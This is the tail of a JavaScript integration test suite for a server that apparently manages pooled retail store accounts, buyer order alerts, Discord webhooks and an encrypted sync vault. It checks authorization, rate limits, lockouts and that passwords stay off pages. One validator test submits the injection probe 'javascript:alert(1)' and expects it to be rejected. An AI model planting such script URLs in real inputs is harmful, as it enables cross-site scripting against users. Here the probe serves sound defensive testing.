    const lines = ["added.one@example.com:pw-one", "added.two@example.com,pw-two", "broken line", "added.three@example.com",
      `${pc.email}:other-pw`, "added.one@example.com:dup", "added.four@example.com:acct-pw:added.four.inbox@example.com:inbox-pw"].join("\n");
    await view(lsLink, { action: "add", store: "pokemoncenter", accounts: lines, password: "" });
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts")[0].n, before, "a link (GET) adds nothing");
    const ad = await sendRaw(lsLink, { action: "add", store: "pokemoncenter", accounts: lines, password: "" });
    assert.equal(ad.status, 303); assert.match(ad.location, /\?t=[^&]+&done=Added\+3[^&]*&err=Line\+3[^&]*&store=pokemoncenter$/, "back to the list with what happened, and the store");
    const html = await page2(await view(lsLink, Object.fromEntries(new URLSearchParams(ad.location.split("?")[1]).entries())));
    assert.ok(html.includes('<option value="pokemoncenter" selected>Pokémon Center</option>'), "the store stays picked");
    assert.ok(html.includes("<p>Added 3 to your Pokémon Center list. 1 was already on it, and kept its password (Edit changes one).</p>"), html.slice(0, 900));
    assert.ok(html.includes(`<p class="err">Line 3 couldn't be read: write each account as email:password. Line 4 has only an email: add it again with the password box filled in.</p>`), html.slice(0, 900));
    for (const pw of ["pw-one", "pw-two", "acct-pw", "inbox-pw", "other-pw"]) assert.ok(!html.includes(pw), "no password on the page: " + pw);
    const got = dbRows("SELECT email, password, key_hash, offer_id FROM accounts WHERE store = 'pokemoncenter' AND email_norm LIKE 'added.%' ORDER BY email_norm");
    const id = lsLink.match(/\/accounts\/list\/([^?]+)/)[1];
    assert.deepEqual(got, [
      { email: "added.four@example.com", password: "acct-pw", key_hash: null, offer_id: "list:" + id },
      { email: "added.one@example.com", password: "pw-one", key_hash: null, offer_id: "list:" + id },
      { email: "added.two@example.com", password: "pw-two", key_hash: null, offer_id: "list:" + id }]);
    assert.equal(dbRows(`SELECT password FROM accounts WHERE store = 'pokemoncenter' AND email_norm = '${pc.email_norm}'`)[0].password, pc.password, "one already there keeps its password");
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts")[0].n, before + 3);
    const shared = await page2(await send(lsLink, { action: "add", store: "target", accounts: "added.three@example.com\n", password: "shared-pw" }));
    assert.ok(shared.includes("<p>Added 1 to your Target list.</p>"), "an email alone takes the password box's");
    assert.equal(dbRows("SELECT password FROM accounts WHERE store = 'target' AND email_norm = 'added.three@example.com'")[0].password, "shared-pw");
    assert.ok(shared.includes('<option value="target" selected>Target</option>'));
    // Lines as FAFO's Send accounts writes them, or a spreadsheet exports them: quoted cells, empty inbox columns, a
    // first line naming the columns. A quoted email is never taken as one.
    const csvLines = ['email,password', '"quoted.one@example.com","p:ss"', 'quoted.two@example.com,"p,ss"', 'quoted.three@example.com,"a""b"',
      'trailing@example.com,pw-t,,', '"bad"@example.com:pw', 'stray@example.com,my"pass', 'tabbed@example.com\t"p""w"'].join("\r\n");
    const qd = await page2(await send(lsLink, { action: "add", store: "target", accounts: csvLines, password: "" }));
    assert.ok(qd.includes("<p>Added 5 to your Target list.</p>") && qd.includes(`<p class="err">Lines 6, 7 couldn't be read: write each account as email:password.</p>`), qd.slice(0, 900));
    assert.deepEqual(dbRows("SELECT email, password FROM accounts WHERE store = 'target' AND (email_norm LIKE 'quoted.%' OR email_norm IN ('trailing@example.com', 'tabbed@example.com')) ORDER BY email_norm"), [
      { email: "quoted.one@example.com", password: "p:ss" }, { email: "quoted.three@example.com", password: 'a"b' },
      { email: "quoted.two@example.com", password: "p,ss" }, { email: "tabbed@example.com", password: 'p"w' }, { email: "trailing@example.com", password: "pw-t" }]);
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm = 'stray@example.com'")[0].n, 0, "a stray quote is reported, not read as another password");
    assert.equal(dbRows(`SELECT COUNT(*) AS n FROM accounts WHERE email LIKE '%"%'`)[0].n, 0, "no email with quotes in it");
    const nowhere = await page2(await send(lsLink, { action: "add", store: "nowhere", accounts: "added.five@example.com:pw" }));
    assert.ok(nowhere.includes(`<p class="err">Pick a store to add them to.</p>`));
    const empty = await page2(await send(lsLink, { action: "add", store: "target", accounts: "  \n" }));
    assert.ok(empty.includes(`<p class="err">Paste the accounts to add, one per line.</p>`));
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm = 'added.five@example.com'")[0].n, 0);
  });
  await test("Give it back says what happens to the buyer's account at the other store with the same email", async () => {
    // A buyer whose Target slot and Pokémon Center slot both check out with one email, the owner's own account on each list.
    const rows = dbRows("SELECT store, email, email_norm, key_hash, key_last4, batch, profile, sent_at FROM accounts");
    const t = rows.find((x) => x.store === "target" && x.key_hash && x.sent_at && !x.batch.startsWith("parked:") && !rows.some((p) => p.store === "pokemoncenter" && p.email_norm === x.email_norm));
    sqlRun(`INSERT INTO accounts (store, email, email_norm, password, added_at, offer_id, key_hash, key_last4, batch, store_name, profile, assigned_at, sent_at)
      SELECT 'pokemoncenter', email, email_norm, 'inbox-pw', added_at, 'own-pc', key_hash, key_last4, batch || '-pc', 'Pokémon Center', profile, assigned_at, sent_at
      FROM accounts WHERE store = 'target' AND email_norm = '${t.email_norm}'`);
    const tEdit = await page2(await view(lsLink, { action: "edit", store: "target", email: t.email_norm }));
    assert.ok(tEdit.includes("Their Pokémon Center slot checks out with this email too, so another buyer's Target slot could get it while they use it."), tEdit.slice(0, 1200));
    // The Target slot's batch declined: its account is held (parked) for the Pokémon Center slot.
    sqlRun(`UPDATE accounts SET batch = 'parked:' || batch WHERE store = 'target' AND email_norm = '${t.email_norm}'`);
    const pEdit = await page2(await view(lsLink, { action: "edit", store: "pokemoncenter", email: t.email_norm }));
    assert.ok(pEdit.includes("Their Target account with this email, held for this slot, goes back on your Target list too."), pEdit.slice(0, 1200));
    const done = await page2(await send(lsLink, { action: "giveback", store: "pokemoncenter", email: t.email_norm }));
    assert.ok(done.includes(`<p>Gave ${t.email} back to your Pokémon Center list. It's free for the next slot. Your Target account with this email came free too.</p>`), done.slice(0, 900));
    assert.deepEqual(dbRows(`SELECT store, key_hash, batch FROM accounts WHERE email_norm = '${t.email_norm}' ORDER BY store`),
      [{ store: "pokemoncenter", key_hash: null, batch: null }, { store: "target", key_hash: null, batch: null }], "both free");
  });
  await test("the link stops working after 24 hours, and asks are limited to 10 a day per license", async () => {
    const id = lsLink.match(/\/accounts\/list\/([^?]+)/)[1];
    execFileSync(process.execPath, [...wrangler, "d1", "execute", "orbit-license", "--local", "--persist-to", join(tmp, "approval"), "--command", `UPDATE account_lists SET created_at = created_at - 86400001 WHERE id = '${id}'`], { cwd: root, env, stdio: "pipe" });
    const r = await fetchOnce(lsLink), html = await r.text();
    assert.equal(r.status, 410); assert.match(html, /This link has expired\. Ask again from FAFO: Settings → Accounts to assign → See my list\./);
    assert.doesNotMatch(html, /@outlook\.com/, "and lists nothing");
    assert.equal((await send(lsLink, { action: "add", store: "target", accounts: "too.late@example.com:pw" })).status, 410, "and changes nothing");
    assert.equal(dbRows("SELECT COUNT(*) AS n FROM accounts WHERE email_norm = 'too.late@example.com'")[0].n, 0);
    let n = dbRows(`SELECT COUNT(*) AS n FROM account_lists WHERE key_hash = (SELECT key_hash FROM account_lists WHERE id = '${id}') AND created_at > ${Date.now() - 86400000}`)[0].n;
    while (n < 10) { assert.equal((await askList()).status, 200); n++; }
    const before = webhookPosts.length;
    assert.equal((await askList()).status, 429, "the 11th today");
    assert.equal(webhookPosts.length, before, "nothing posted");
    assert.equal((await askList(hanaKey)).status, 200, "another license still can");
  });
  await test("CSV batches count toward 30 an hour per license", async () => {
    let sent = 0, limited = false;
    for (let i = 0; i < 40 && !limited; i++){
      const st = (await slots("/submissions", frankKey, { csv, slots: 1 })).status;
      if (st === 429) limited = true; else { assert.equal(st, 200); sent++; }
    }
    assert.ok(limited, "hit the limit");
    const d = await (await admin("/admin/submissions")).json();
    assert.equal(d.submissions.filter((x) => x.key_last4 === frankKey.slice(-4) && Date.now() - x.created_at < 3600e3).length, 30);
  });

  console.log("\nOrder alerts (app 1.9.69+)");
  // Frank's Orbit is the owner's here; Gina and Bob were given accounts above.
  const getAuth = (path, key) => fetch(BASE + path, { headers: { authorization: "Bearer " + key }, cache: "no-store" });
  const putAuth = (path, key, body) => fetch(BASE + path, { method: "PUT", headers: { authorization: "Bearer " + key, "content-type": "application/json" }, body: JSON.stringify(body) });
  const reviewIn = (content) => (content.match(/\((http[^)]+\/alerts\/review\/[^)]+)\)/) || [])[1];
  const today = new Date().toISOString().slice(0, 10);
  let ginaAcct, bobAcct, firstAlert;
  const orderEvent = (o) => ({ account: ginaAcct.email.toUpperCase(), store: "target", storeName: "Target", orderNo: "ord-1001", item: "Pokémon 151 Booster Bundle", qty: "2", total: "$59.98", stage: "placed", at: today, ...o });
  await test("only the allowed sender sends order alerts or sees the accounts given out", async () => {
    const given = (await accounts()).given;
    ginaAcct = given.find((a) => a.key_last4 === ginaKey.slice(-4)); bobAcct = given.find((a) => a.key_last4 === bobKey.slice(-4));
    assert.ok(ginaAcct && bobAcct, "accounts given out above");
    assert.equal((await slots("/alerts", frankKey, { events: [orderEvent()] })).status, 403);
    assert.equal((await getAuth("/alerts/accounts", frankKey)).status, 403);
    assert.equal((await slots("/alerts", null, { events: [orderEvent()] })).status, 401);
    assert.deepEqual(await (await getAuth("/alerts/sender", frankKey)).json(), { status: "none", canAsk: true });
  });
  let senderLink;
  await test("asking posts a review link to the channel; it waits for the owner", async () => {
    assert.deepEqual(await (await slots("/alerts/sender", frankKey, { name: "Owner" })).json(), { status: "pending" });
    await new Promise((ok) => setTimeout(ok, 400));
    const m = webhookPosts.at(-1).content;
    assert.match(m, /Let this FAFO send order alerts to buyers\?/); assert.match(m, /\*\*Owner\*\* · @frank · license …/);
    senderLink = reviewIn(m); assert.ok(senderLink, m);
    assert.equal((await (await getAuth("/alerts/sender", frankKey)).json()).status, "pending");
    assert.match(await (await fetch(senderLink)).text(), /Only allow it if you turned it on/);
    assert.equal((await fetch(senderLink.replace(/t=[^&]+/, "t=wrong"))).status, 404);
  });
  await test("allowing it makes that license the sender, and the channel message says so", async () => {
    assert.match(await (await offerPost(senderLink, "allow")).text(), /Allowed\. Orders on the accounts you assign now reach the buyers who have them\./);
    await new Promise((ok) => setTimeout(ok, 300));
    assert.match(webhookEdits.at(-1).content, /Sends order alerts to buyers/);
    assert.equal((await (await getAuth("/alerts/sender", frankKey)).json()).status, "allowed");
    assert.match(await (await offerPost(senderLink, "refuse")).text(), /Sends order alerts to buyers/, "decided: stays allowed");
    const acc = (await (await getAuth("/alerts/accounts", frankKey)).json()).accounts;
    assert.ok(acc.some((a) => a.email === ginaAcct.email && a.store === "target") && acc.some((a) => a.email === bobAcct.email), "the accounts given out");
    assert.ok(acc.every((a) => Object.keys(a).sort().join() === "email,store"), "just the email and store, never passwords");
    assert.equal((await getAuth("/alerts/accounts", ginaKey)).status, 403);
  });
  await test("an order on a given-out account reaches that buyer, without the account", async () => {
    const r = await (await slots("/alerts", frankKey, { events: [
      orderEvent(), orderEvent({ account: "nobody@example.com" }), orderEvent({ store: "walmart" }), orderEvent({ at: "2020-01-01", orderNo: "OLD-1" }), orderEvent({ stage: "lost" })] })).json();
    assert.deepEqual(r, { ok: true, sent: 1, already: 0, unknown: 4 }, "not given out, another store, from before it was given out, or not a step");
    const got = await (await getAuth("/alerts", ginaKey)).json();
    assert.equal(got.alerts.length, 1);
    firstAlert = got.alerts[0];
    const { id, oid, createdAt, ...rest } = firstAlert;
    assert.deepEqual(rest, { store: "target", storeName: "Target", profile: ginaAcct.profile, orderNo: "ORD-1001", item: "Pokémon 151 Booster Bundle", qty: "2", total: "$59.98", stage: "placed", at: today });
    assert.ok(id && oid && createdAt > 0);
    assert.doesNotMatch(JSON.stringify(got), new RegExp(ginaAcct.email.replace(/[.+]/g, "\\$&"), "i"), "never the account");
    assert.equal((await (await getAuth("/alerts", bobKey)).json()).alerts.length, 0, "nothing for anyone else");
    assert.equal((await getAuth("/alerts", null)).status, 401);
  });
  await test("the same step isn't sent twice; the next one is, under the same order", async () => {
    assert.deepEqual(await (await slots("/alerts", frankKey, { events: [orderEvent()] })).json(), { ok: true, sent: 0, already: 1, unknown: 0 });
    assert.deepEqual(await (await slots("/alerts", frankKey, { events: [orderEvent({ stage: "shipped" })] })).json(), { ok: true, sent: 1, already: 0, unknown: 0 });
    const since = await (await getAuth("/alerts?since=" + firstAlert.createdAt, ginaKey)).json();
    assert.deepEqual(since.alerts.map((a) => [a.stage, a.oid]), [["shipped", firstAlert.oid]]);
    assert.equal((await slots("/alerts", frankKey, { events: [] })).status, 400);
    assert.equal((await slots("/alerts", frankKey, { events: Array.from({ length: 201 }, () => orderEvent()) })).status, 400);
  });
  await test("a buyer's own Discord webhook is checked with a test post, then gets their alerts", async () => {
    const hook = `http://127.0.0.1:${DISCORD_PORT}/buyerhook/123456789/tok_gina_abcdefghijklmnopqrstuvwxyz`;
    assert.deepEqual(await (await getAuth("/alerts/webhook", ginaKey)).json(), { set: false });
    for (const url of ["https://example.com/hook", "https://discord.com/api/webhooks/abc/def", "javascript:alert(1)"])
      assert.equal((await putAuth("/alerts/webhook", ginaKey, { url })).status, 400, url);
    const dead = await putAuth("/alerts/webhook", ginaKey, { url: hook.replace("/buyerhook/", "/buyerhook/dead/") });
    assert.equal(dead.status, 400); assert.match((await dead.json()).error, /Discord answered 404\. Check the webhook link\./);
    assert.deepEqual(await (await putAuth("/alerts/webhook", ginaKey, { url: hook })).json(), { set: true });
    assert.equal(buyerHookPosts.at(-1).content, "✅ FAFO will post your order alerts here.");
    assert.equal((await (await getAuth("/alerts/webhook", ginaKey)).json()).set, true);
    const before = buyerHookPosts.length;
    await slots("/alerts", frankKey, { events: [orderEvent({ stage: "delivered" }), orderEvent({ account: bobAcct.email, orderNo: "BOB-7" })] });
    await new Promise((ok) => setTimeout(ok, 500));
    const posted = buyerHookPosts.slice(before);
    assert.equal(posted.length, 1, "Gina's alert only: Bob has no webhook");
    assert.equal(posted[0].content, `🏠 **Delivered** · Target\n${ginaAcct.profile} · Pokémon 151 Booster Bundle ×2 · $59.98\n-# Order #ORD-1001 · ${today}`);
    assert.deepEqual(posted[0].allowed_mentions, { parse: [] });
    assert.equal((await (await getAuth("/alerts", bobKey)).json()).alerts[0].orderNo, "BOB-7");
  });
  await test("removing the webhook stops the posts; setting one again right away waits a moment", async () => {
    const hook = `http://127.0.0.1:${DISCORD_PORT}/buyerhook/123456789/tok_gina_abcdefghijklmnopqrstuvwxyz`;
    assert.equal((await putAuth("/alerts/webhook", ginaKey, { url: hook })).status, 429, "one change every 5 seconds");
    assert.deepEqual(await (await putAuth("/alerts/webhook", ginaKey, { url: "" })).json(), { set: false });
    const before = buyerHookPosts.length;
    await slots("/alerts", frankKey, { events: [orderEvent({ orderNo: "ORD-2002" })] });
    await new Promise((ok) => setTimeout(ok, 400));
    assert.equal(buyerHookPosts.length, before);
    assert.equal((await (await getAuth("/alerts", ginaKey)).json()).alerts.length, 4, "still kept for the app");
  });
  await test("allowing another license replaces the sender; refusing one leaves it out", async () => {
    await slots("/alerts/sender", bobKey, { name: "Second PC" });
    await new Promise((ok) => setTimeout(ok, 400));
    await offerPost(reviewIn(webhookPosts.at(-1).content), "allow");
    await new Promise((ok) => setTimeout(ok, 300));
    assert.equal((await slots("/alerts", frankKey, { events: [orderEvent({ orderNo: "ORD-3003" })] })).status, 403, "the first one no longer sends");
    assert.equal((await (await getAuth("/alerts/sender", frankKey)).json()).status, "none");
    assert.ok(webhookEdits.some((e) => /No longer sends order alerts/.test(e.content)), "its channel message says so");
    await slots("/alerts/sender", ginaKey, {});
    await new Promise((ok) => setTimeout(ok, 400));
    assert.match(await (await offerPost(reviewIn(webhookPosts.at(-1).content), "refuse")).text(), /Refused\. This FAFO won&#39;t send order alerts\./);
    assert.equal((await (await getAuth("/alerts/sender", ginaKey)).json()).status, "refused");
    assert.equal((await slots("/alerts", ginaKey, { events: [orderEvent()] })).status, 403);
    assert.equal((await (await getAuth("/alerts/sender", bobKey)).json()).status, "allowed");
  });
  await test("admin lists who sends alerts and how many each buyer got, never what they say", async () => {
    const d = await (await admin("/admin/alerts")).json();
    assert.deepEqual(d.senders.map((s) => s.status).sort(), ["allowed", "refused", "replaced"]);
    const g = d.buyers.find((b) => b.username === "gina");
    assert.equal(g.alerts, 4); assert.equal(g.discordWebhook, false);
    assert.doesNotMatch(JSON.stringify(d), /ORD-1001|Booster|review_token/);
  });

  console.log("\nWeb version and sync: vault storage");
  await startWorker("vault", APPROVAL_PORT + 2, ["REQUIRE_APPROVAL=", "REQUIRED_GUILD_ID=", "MIN_ACCOUNT_AGE_DAYS=0", "VAULT_LOCK_MS=3000", "VAULT_MIN_GAP_MS=300"]);
  const [V1, V2] = VAULT_KEYS;
  const b64 = (n) => Buffer.from(crypto.getRandomValues(new Uint8Array(n))).toString("base64");
  const tok = () => Buffer.from(crypto.getRandomValues(new Uint8Array(32))).toString("base64url");
  // A record shaped like the app's: a big random "ciphertext" stands in for the sealed vault.
  const sealed = (salt, ctBytes = 2000, iter = 600000) => ({ format: "orbit-sync", v: 1, z: "gzip", kdf: "PBKDF2-SHA256", iter, salt, iv: b64(12), ct: Buffer.from(crypto.getRandomValues(new Uint8Array(Math.min(ctBytes, 65536)))).toString("base64").repeat(Math.ceil(ctBytes / 65536)), savedAt: new Date().toISOString() });
  const vault = (path, key, { method = "GET", auth, newAuth, record, salt, iter = 600000, raw } = {}) => fetch(BASE + path, { method,
    headers: { ...(key ? { authorization: "Bearer " + key } : {}), ...(auth ? { "x-vault-auth": auth } : {}), ...(newAuth ? { "x-vault-new-auth": newAuth } : {}),
      ...(record || raw ? { "content-type": "application/json", "x-vault-salt": salt || (record && record.salt) || "", "x-vault-iter": String(iter) } : {}) },
    body: raw != null ? raw : record ? JSON.stringify(record) : undefined });
  const wait = (ms) => new Promise((ok) => setTimeout(ok, ms));
  const salt1 = b64(16), token1 = tok();
  let rec1, created1;
  await test("no vault yet: info says so, and a bad or missing license is refused", async () => {
    assert.deepEqual(await (await vault("/vault/info", V1)).json(), { exists: false });
    assert.equal((await vault("/vault/info", "PVLT-NOPE-NOPE-NOPE-NOPE")).status, 401);
    assert.equal((await vault("/vault/info")).status, 401);
    assert.equal((await vault("/vault", V1, { auth: token1 })).status, 404);
  });
  await test("the first save creates it (revision 1), and info gives what a new device needs", async () => {
    rec1 = sealed(salt1);
    const made = await (await vault("/vault?base=0&device=Desktop%20app", V1, { method: "PUT", auth: token1, record: rec1 })).json();
    assert.equal(made.rev, 1); assert.ok(Math.abs(Date.now() - made.created) < 60000, "created says when (the vault's id)");
    created1 = made.created;
    const info = await (await vault("/vault/info", V1.toLowerCase())).json();
    assert.equal(info.exists, true); assert.equal(info.rev, 1); assert.equal(info.created, created1); assert.equal(info.salt, salt1); assert.equal(info.iter, 600000);
    assert.equal(info.device, "Desktop app"); assert.equal(info.size, JSON.stringify(rec1).length); assert.ok(Date.now() - info.updatedAt < 60000);
  });
  await test("reading it back takes the token, and returns exactly what was sent", async () => {
    const r = await (await vault("/vault", V1, { auth: token1 })).json();
    assert.equal(r.rev, 1); assert.equal(r.created, created1); assert.equal(r.device, "Desktop app"); assert.deepEqual(r.record, rec1);
    assert.deepEqual(await (await vault("/vault?have=1", V1, { auth: token1 })).json(), { rev: 1, created: created1, same: true });
    assert.equal((await vault("/vault", V1)).status, 403, "no token");
    assert.equal((await vault("/vault", V1, { auth: tok() })).status, 403, "wrong token");
    assert.equal((await vault("/vault", V2, { auth: token1 })).status, 404, "another license has its own (none yet)");
  });
  await test("a save names the revision it started from; a stale one gets 409 with the current revision", async () => {
    await wait(350);
    const rec2 = sealed(salt1);
    assert.deepEqual(await (await vault(`/vault?base=1&vid=${created1}&device=Web`, V1, { method: "PUT", auth: token1, record: rec2 })).json(), { rev: 2, created: created1 });
    const stale = await vault("/vault?base=1&device=Desktop%20app", V1, { method: "PUT", auth: token1, record: sealed(salt1) });
    assert.equal(stale.status, 409); assert.deepEqual(await stale.json(), { error: "changed on another device", rev: 2, created: created1 });
    const again = await vault("/vault?base=0", V1, { method: "PUT", auth: token1, record: sealed(salt1) });
    assert.equal(again.status, 409, "creating again isn't allowed once it exists");
    const r = await (await vault("/vault?have=1", V1, { auth: token1 })).json();
    assert.equal(r.rev, 2); assert.deepEqual(r.record, rec2); assert.equal(r.device, "Web");
  });
  await test("saves closer than the minimum gap are turned away", async () => {
    await wait(350);
    assert.equal((await vault("/vault?base=2", V1, { method: "PUT", auth: token1, record: sealed(salt1) })).status, 200);
    assert.equal((await vault("/vault?base=3", V1, { method: "PUT", auth: token1, record: sealed(salt1) })).status, 429);
  });
  await test("a save that names another vault (one deleted and made again) gets 409, even on the same revision", async () => {
    await wait(350);
    const r = await vault(`/vault?base=3&vid=${created1 - 1}`, V1, { method: "PUT", auth: token1, record: sealed(salt1) });
    assert.equal(r.status, 409); assert.deepEqual(await r.json(), { error: "changed on another device", rev: 3, created: created1 });
  });
  await test("two devices saving at once from the same revision: one wins, the other gets 409", async () => {
    await wait(350);
    const [a, b] = await Promise.all([1, 2].map(() => vault("/vault?base=3", V1, { method: "PUT", auth: token1, record: sealed(salt1, 300000) })));
    assert.deepEqual([a.status, b.status].sort(), [200, 409]);
    const info = await (await vault("/vault/info", V1)).json();
    assert.equal(info.rev, 4);
    const r = await (await vault("/vault", V1, { auth: token1 })).json();
    assert.equal(r.rev, 4); assert.ok(r.record.ct.length > 300000, "the winner's record is whole");
  });
  await test("a vault of several megabytes goes in chunks and comes back whole; over 8 million characters is refused", async () => {
    await wait(350);
    const big = sealed(salt1, 3_000_000);
    assert.deepEqual(await (await vault("/vault?base=4", V1, { method: "PUT", auth: token1, record: big })).json(), { rev: 5, created: created1 });
    const r = await (await vault("/vault", V1, { auth: token1 })).json();
    assert.equal(r.rev, 5); assert.equal(r.record.ct, big.ct);
    await wait(350);
    const huge = sealed(salt1, 6_200_000);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, record: huge })).status, 413);
  });
  await test("only a sealed record sealed with the salt it names is taken", async () => {
    await wait(350);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, raw: '{"hello":"world"}', salt: salt1 })).status, 400);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, record: sealed(b64(16)), salt: salt1 })).status, 400, "salt header doesn't match the record");
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: "short", record: sealed(salt1) })).status, 400);
    assert.equal((await vault("/vault?base=x", V1, { method: "PUT", auth: token1, record: sealed(salt1) })).status, 400);
  });
  const salt2 = b64(16), token2 = tok();
  await test("a new password: the record on a new salt needs the new token, then only the new token works", async () => {
    await wait(350);
    assert.equal((await vault("/vault?base=5", V1, { method: "PUT", auth: token1, record: sealed(salt2) })).status, 400, "no new token");
    assert.deepEqual(await (await vault("/vault?base=5", V1, { method: "PUT", auth: token1, newAuth: token2, record: sealed(salt2) })).json(), { rev: 6, created: created1 });
    const old = await vault("/vault", V1, { auth: token1 });
    assert.equal(old.status, 403); assert.equal((await old.json()).error, "password changed", "the old password is recognized as the old one");
    assert.equal((await (await vault("/vault", V1, { auth: token2 })).json()).rev, 6);
    assert.equal((await (await vault("/vault/info", V1)).json()).salt, salt2);
  });
  await test("a device still on the previous password never locks the vault, however often it tries", async () => {
    for (let i = 0; i < 12; i++) assert.equal((await vault("/vault", V1, { auth: token1 })).status, 403);
    assert.equal((await vault("/vault", V1, { auth: token2 })).status, 200);
  });
  await test("10 wrong passwords lock the vault for a while, even for the right one; it opens again after", async () => {
    for (let i = 0; i < 10; i++) assert.equal((await vault("/vault", V1, { auth: tok() })).status, 403);
    const locked = await vault("/vault", V1, { auth: token2 });
    assert.equal(locked.status, 429); assert.ok((await locked.json()).retryAfter >= 1);
    assert.equal((await vault("/vault?base=6", V1, { method: "PUT", auth: token2, record: sealed(salt2) })).status, 429, "saving too");
    await wait(3200);   // VAULT_LOCK_MS is 3000 here
    assert.equal((await vault("/vault", V1, { auth: token2 })).status, 200);
    assert.equal((await vault("/vault", V1, { auth: tok() })).status, 403, "the count started over");
    assert.equal((await vault("/vault", V1, { auth: token2 })).status, 200);
  });
  await test("browsers can call it: the preflight allows PUT, DELETE and the vault headers", async () => {
    const r = await fetch(BASE + "/vault", { method: "OPTIONS" });
    assert.equal(r.status, 204);
    assert.match(r.headers.get("access-control-allow-methods"), /PUT/); assert.match(r.headers.get("access-control-allow-methods"), /DELETE/);
    for (const h of ["x-vault-auth", "x-vault-new-auth", "x-vault-salt", "x-vault-iter", "authorization"]) assert.match(r.headers.get("access-control-allow-headers"), new RegExp(h));
    assert.equal((await vault("/vault/info", V1)).headers.get("access-control-allow-origin"), "*");
  });
  await test("the owner sees whose vaults there are and how big, never what's in them", async () => {
    await vault("/vault?base=0&device=Web", V2, { method: "PUT", auth: tok(), record: sealed(b64(16)) });
    const d = await (await admin("/admin/vaults")).json();
    assert.equal(d.vaults.length, 2);
    const v = d.vaults.find((x) => x.rev === 6);
    assert.ok(v && v.size > 0 && typeof v.device === "string" && v.license.length === 12 && !("record" in v) && !JSON.stringify(d).includes(salt2));
    assert.equal(d.vaults.find((x) => x.rev === 1).device, "Web");
    assert.equal((await fetch(BASE + "/admin/vaults")).status, 401);
  });
  await test("deleting takes the license key alone (a forgotten password), and the devices can start over", async () => {
    assert.deepEqual(await (await vault("/vault", V2, { method: "DELETE" })).json(), { ok: true, deleted: true });
    assert.deepEqual(await (await vault("/vault/info", V2)).json(), { exists: false });
    assert.equal((await vault("/vault", "PVLT-NOPE-NOPE-NOPE-NOPE", { method: "DELETE" })).status, 401);
    const before = (await (await vault("/vault/info", V1)).json()).created;
    const again = await (await vault("/vault?base=0", V2, { method: "PUT", auth: tok(), record: sealed(b64(16)) })).json();
    assert.equal(again.rev, 1); assert.ok(again.created > 0);
    assert.equal(before, created1, "the other license's vault keeps its id");
  });
  console.log(`\n${passed} passed`);
} finally {
  for (const w of workers) stopWorker(w);
  discord.close();
  // Windows can hold on to the database files for a few seconds after the workers stop.
  for (let i = 0; i < 20; i++) {
    try { rmSync(tmp, { recursive: true, force: true, maxRetries: 5, retryDelay: 300 }); break; }
    catch { await new Promise((r) => setTimeout(r, 500)); }
  }
}
